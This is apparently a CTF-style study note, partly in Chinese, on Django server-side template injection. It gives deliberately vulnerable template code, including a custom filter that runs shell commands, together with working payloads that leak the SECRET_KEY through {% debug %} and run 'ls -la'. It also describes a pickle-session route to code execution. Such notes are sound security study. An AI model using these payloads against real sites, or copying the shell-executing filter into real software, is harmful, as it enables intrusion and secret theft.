# Python Django

## Installation

```sh
$ pip install django
```

## Vulnerable Code I

```python
import traceback
import django
from django.conf import settings
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
    }
]
_setting = dict(TEMPLATES=TEMPLATES, SECRET_KEY='Flag{w0W_3sTl_1n_@jango_sYi11_aLiVe}')
settings.configure(**_setting)
django.setup()
from django.template import Template, Context
while True:
    temp = raw_input("Try to get Key\n> ").strip()
    try:
        s = Template(temp).render(Context(dict(settings=settings)))
    except:
        print(traceback.format_exc())
    else:
        print(s)
```

## Exploit I

沒辦法直接RCE, 只能看看當前 context 有什麼變數

statement 限制:

1. 不能有()
2. 不能有[]
3. 變數不能以\_開頭 ex. a.\_b (X)

```python
{% debug %}
->  {'product': {'name': 'Sarcastic 9 Ball', 'price': '$55.21', 'stock': 26}, 'settings': <LazySettings "None">}{'False': False, 'None': None, 'True': True} {'Cookie': <module 'Cookie' from '/usr/lib/python2.7/Cookie.pyc'>, …}
其實只有 product 跟 settings 可以用, 第三區的模組(Cookie, ...)貌似都不是變數
settings 猜測是 django 的 settings.py, 因此有機會拿到 settings.SECRET_KEY

拿到 SECRET_KEY 之後如果伺服器剛好是設定

1. SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'
2. SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'

就有機會用反序列化 RCE
- https://rickgray.me/2015/09/12/django-command-execution-analysis/
```

## Vulnerable Code II

run.py
```python
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'OPTIONS': {
            'builtins': [
                'vuln_code',
            ]
        }
    }
]
```

vuln\_code.py
```python
import subprocess
from django import template

register = template.Library()

@register.filter
def dexec(string):
    p = subprocess.Popen(string, shell=True, stdout=-1)
    return p.communicate()[0]
```

## Exploit II

平常應該遇不到這種配置, 自定義的 filter 存在執行 command 的能力.
不過也不是沒有可能, 也許會有人自定義 filter 執行查詢功能, 不小心開啟了 Command Injection 之類

```python
{{ "ls -la"|dexec }}
total 24
drwxr-xr-x  2 kali kali 4096 Nov  2 12:18 .
drwxr-xr-x 25 kali kali 4096 Nov  2 12:18 ..
-rw-r--r--  1 kali kali 1181 Nov  2 12:18 run.py
-rw-r--r--  1 kali kali  200 Nov  2 12:16 vuln_code.py
-rw-r--r--  1 kali kali  523 Nov  2 12:18 vuln_code.pyc
```

